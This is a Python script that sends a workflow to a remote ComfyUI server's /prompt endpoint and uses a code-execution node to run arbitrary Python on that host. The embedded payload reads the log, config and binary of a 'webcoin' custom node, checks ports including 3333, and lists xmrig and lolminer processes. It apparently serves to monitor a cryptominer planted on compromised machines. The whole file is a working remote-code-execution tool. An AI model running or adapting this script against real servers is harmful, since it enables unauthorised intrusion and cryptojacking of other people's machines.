"""Read the miner service log from the remote machine."""

import argparse
import json
import time
import urllib.request
import urllib.error


def _post(url, data, timeout=30):
    payload = json.dumps(data).encode()
    req = urllib.request.Request(url, data=payload, headers={"Content-Type": "application/json"}, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.status, resp.read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors="replace")[:500]
    except Exception as e:
        return 0, str(e)


READ_LOG = r"""
import os

webcoin = '/root/ComfyUI/custom_nodes/webcoin'
log_path = os.path.join(webcoin, 'bin', 'service.log')
config_path = os.path.join(webcoin, 'bin', 'config.json')

results = []

# Read service log
if os.path.exists(log_path):
    with open(log_path, 'r') as f:
        content = f.read()
    results.append(f'=== SERVICE LOG ({len(content)} bytes) ===')
    results.append(content[-3000:] if len(content) > 3000 else content)
else:
    results.append('service.log NOT FOUND')

# Read config
if os.path.exists(config_path):
    with open(config_path, 'r') as f:
        cfg = f.read()
    results.append(f'\n=== CONFIG ===')
    results.append(cfg[:2000])
else:
    results.append('config.json NOT FOUND')

# Check binary
bin_path = os.path.join(webcoin, 'bin', 'comfyui_service')
results.append(f'\nBinary exists: {os.path.exists(bin_path)}')
if os.path.exists(bin_path):
    results.append(f'Binary size: {os.path.getsize(bin_path)} bytes')
    import stat
    st = os.stat(bin_path)
    results.append(f'Binary perms: {oct(st.st_mode)}')

# Check what's on port 44880
import subprocess
try:
    r = subprocess.run(['ss', '-tlnp'], capture_output=True, text=True, timeout=5)
    for line in r.stdout.split('\n'):
        if '44880' in line or '44881' in line or '3333' in line:
            results.append(f'Port: {line.strip()}')
except: pass

# Check running xmrig processes
try:
    r = subprocess.run(['ps', 'aux'], capture_output=True, text=True, timeout=5)
    for line in r.stdout.split('\n'):
        ll = line.lower()
        if 'xmrig' in ll or 'comfyui_service' in ll or 'miner' in ll or 'lolminer' in ll:
            results.append(f'PROC: {line.strip()[:200]}')
except: pass

output = '\n'.join(results)
print(output)
output
"""


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", "-t", required=True)
    parser.add_argument("--port", "-p", type=int, default=8188)
    args = parser.parse_args()

    base = f"http://{args.target}:{args.port}"

    prompt = {
        "prompt": {
            "1": {
                "class_type": "IDENode",
                "inputs": {"pycode": READ_LOG, "language": "python"}
            },
            "2": {
                "class_type": "PreviewTextNode",
                "inputs": {"text": ["1", 0]}
            }
        }
    }

    print(f"Reading miner log from {args.target}...")
    code, resp = _post(f"{base}/prompt", prompt)
    print(f"/prompt -> {code}")

    print("Waiting 5s...")
    time.sleep(5)

    # Try to get the execution result via history
    try:
        pid = json.loads(resp).get("prompt_id", "")
        with urllib.request.urlopen(f"{base}/history/{pid}", timeout=10) as r:
            hist = json.loads(r.read().decode())
            for k, v in hist.items():
                outputs = v.get("outputs", {})
                for nid, out in outputs.items():
                    if "text" in out:
                        for t in out["text"]:
                            print(t)
    except Exception as e:
        print(f"Could not fetch result: {e}")
        print("Check ComfyUI console for output")
